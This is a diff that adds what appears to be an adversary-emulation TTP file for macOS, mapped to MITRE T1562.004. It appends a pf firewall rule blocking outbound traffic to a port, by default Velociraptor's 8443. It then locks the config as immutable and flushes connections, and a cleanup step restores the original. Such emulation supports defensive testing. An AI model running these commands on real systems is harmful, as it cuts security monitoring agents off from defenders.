@@ -1,0 +1,53 @@
+---
+api_version: 2.0
+uuid: c40aaafa-ac13-4bb6-a459-28b7a1093dc8
+name: Blocking outbound traffic to specified port
+authors:
+  - hmashru
+description: |
+  This TTP modifies the system firewall to block all outbound packets to port specified by user (8443 for velociraptor).
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - TA0005 Defense Evasion
+  techniques:
+    - T1562 Impair Defenses
+  subtechniques:
+    - T1562.004 Disable or Modify System Firewall
+args:
+  - name: port_to_block
+    description: Taking user input for the destination port to block for outbound traffic
+    default: 8443
+steps:
+  - name: Creating backup and updating firewall rules
+    inline: |
+      echo "Creating backup..."
+      sudo cp /etc/pf.conf /etc/pf.conf.bak
+      echo "Blocking remote port specified by user..."
+      echo "block drop out quick proto tcp to any port {{.Args.port_to_block}}" | sudo tee -a /etc/pf.conf
+      echo "Checking updated firewall rule: "
+      sudo cat /etc/pf.conf | grep -A3 "port {{.Args.port_to_block}}"
+      echo "Making conf file immutable"
+      sudo chflags uchg /etc/pf.conf
+  - name: Restarting firewall to load new rules and dropping existing connections
+    inline: |
+      echo "Current running rules before restart: "
+      sudo pfctl -s rules
+      echo "Restarting to update rules"
+      sudo pfctl -f /etc/pf.conf
+      echo "Current running rules after restart: "
+      sudo pfctl -s rules
+      echo "Flushing existing connections: "
+      sudo pfctl -Fs
+    cleanup:
+      inline: |
+        echo "Removing updated conf file: "
+        sudo chflags nouchg /etc/pf.conf
+        sudo rm -f /etc/pf.conf
+        echo "Restoring original conf file: "
+        sudo mv /etc/pf.conf.bak /etc/pf.conf
+        sudo pfctl -f /etc/pf.conf
+        echo "Restored rules: "
+        sudo pfctl -s rules
